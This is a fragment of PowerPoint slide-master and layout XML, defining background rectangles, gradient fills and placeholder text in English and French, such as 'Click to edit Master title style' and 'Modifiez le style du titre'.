      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Rectangle 40"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="180256"/>
            <a:ext cx="9144000" cy="6677744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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noProof="0">
              <a:solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Rectangle 41"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5877272"/>
            <a:ext cx="9144000" cy="980728"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Rectangle 42"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3541" y="236"/>
            <a:ext cx="9144000" cy="360040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:pattFill prst="ltUpDiag">
            <a:fgClr>
              <a:srgbClr val="D6C192"/>
            </a:fgClr>
            <a:bgClr>
              <a:srgbClr val="F6F1DE"/>
            </a:bgClr>
          </a:pattFill>
          <a:ln>
            <a:noFill/>
          </a:ln>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noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>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noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Rectangle 44"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5877272"/>
            <a:ext cx="9144000" cy="144016"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr"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noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Title Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="404664"/>
            <a:ext cx="8229600" cy="864096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" dirty="0" smtClean="0"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Content Placeholder 48"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="1412776"/>
            <a:ext cx="8207375" cy="4393307"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="273050" indent="-273050" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent3">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr kumimoji="0" lang="en-US" sz="2600" kern="1200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="850392" indent="-457200" algn="l">
              <a:buClr>
                <a:schemeClr val="accent3">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr kumimoji="0" lang="en-US" sz="2400" kern="1200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1124712" indent="-457200" algn="l">
              <a:buClr>
                <a:schemeClr val="accent3">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr kumimoji="0" lang="en-US" sz="2100" kern="1200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1435608" indent="-457200" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent3">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr kumimoji="0" lang="en-US" sz="2000" kern="1200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1709928" indent="-457200" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent3">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr kumimoji="0" lang="en-US" sz="2000" b="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="274320" lvl="0" indent="-274320" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent3"/>
              </a:buClr>
              <a:buSzPct val="95000"/>
              <a:buFont typeface="Wingdings 2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Click to edit Master text styles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="640080" lvl="1" indent="-246888" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings 2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Second level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="2" indent="-246888" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent2"/>
              </a:buClr>
              <a:buSzPct val="70000"/>
              <a:buFont typeface="Wingdings 2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Third level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1188720" lvl="3" indent="-210312" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent3"/>
              </a:buClr>
              <a:buSzPct val="65000"/>
              <a:buFont typeface="Wingdings 2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Fourth level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1463040" lvl="4" indent="-210312" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent4"/>
              </a:buClr>
              <a:buSzPct val="65000"/>
              <a:buFont typeface="Wingdings 2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Fifth level</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="1893717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a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sous-titr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smtClean="0"/>
              <a:t>Modifiez le style des sous-titres du masque</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé de la date 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé du pied de page 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du numéro de diapositive 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="1999959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p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé du contenu 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600200"/>
            <a:ext cx="8229600" cy="4525963"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Deuxième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Troisième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Quatrième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Cinquième niveau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé de la date 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé du pied de page 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du numéro de diapositive 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="271830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noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé du texte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smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé de la date 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé du pied de page 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du numéro de diapositive 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="2797817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p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé du contenu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smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Deuxième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Troisième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Quatrième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Cinquième niveau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du contenu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smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Deuxième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Troisième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Quatrième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Cinquième niveau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé de la date 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du pied de page 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Espace réservé du numéro de diapositive 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3696439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lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé du texte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Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du contenu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smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Deuxième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
